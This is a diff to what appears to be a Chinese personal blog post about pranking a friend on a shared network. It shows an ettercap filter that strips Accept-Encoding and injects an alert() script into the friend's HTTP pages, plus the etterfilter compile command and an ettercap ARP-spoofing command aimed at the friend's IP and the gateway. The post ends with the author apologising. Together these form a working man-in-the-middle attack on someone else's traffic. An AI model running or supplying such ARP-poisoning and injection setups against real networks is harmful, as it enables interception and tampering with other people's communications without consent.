@@ -37,14 +37,14 @@ if (ip.proto == TCP && tcp.dst == 80)
 {
     if (search(DATA.data, "Accept-Encoding"))
     {
-        replace("Accept-Encoding", "Q'W'Q");
+        replace("Accept-Encoding", "Gengxin-NoEncoding");
         msg("就是不让你压缩Q'W'Q\n");
     }
 }
 if (ip.proto == TCP && tcp.src == 80)
 {
-    replace("<head>", "<head><script type="text/javascript">alert('Gengxin想ban你哦Q/W\\Q');</script>");
-    replace("<HEAD>", "<HEAD><script type="text/javascript">alert('Gengxin想ban你哦Q/W\\Q')');</script>");
+    replace("<head>", "<head><script type="text/javascript">alert('Gengxin想ban你哦QWQ');</script>");
+    replace("<HEAD>", "<HEAD><script type="text/javascript">alert('Gengxin想ban你哦QWQ')');</script>");
     msg("成功注入Q'W'Q!!\n");
 }  
 {% endhighlight %}
@@ -66,6 +66,16 @@ etterfilter banLGC.filter -o banLGC.ef
 ettercap -i eth0 -Tq -M arp:remote /192.168.31.106// /192.168.31.1// -F banLGC.ef
 ~~~
 
+然后在Gengxin的电脑上，成功的打印出了`成功注入Q'W'Q!!`
+
+<figure>
+  <a href="http://images2015.cnblogs.com/blog/831801/201609/831801-20160919114624871-1977932968.jpg"><img src="http://images2015.cnblogs.com/blog/831801/201609/831801-20160919114624871-1977932968.jpg"></a>
+</figure>
+
 猛然间，不远处的LGC发出了杠铃般的笑声————Gengxin！你要做什么！我网速是怎么了！！   
-Gengxin开心地扑了过去，心情是这样的  
-![]()
+  
+然后基友就一上午没有理我QAQ'A'Q  
+
+最后Gengxin还是跟系又说明了情况，然后道了歉  
+
+然后就没有然后了  
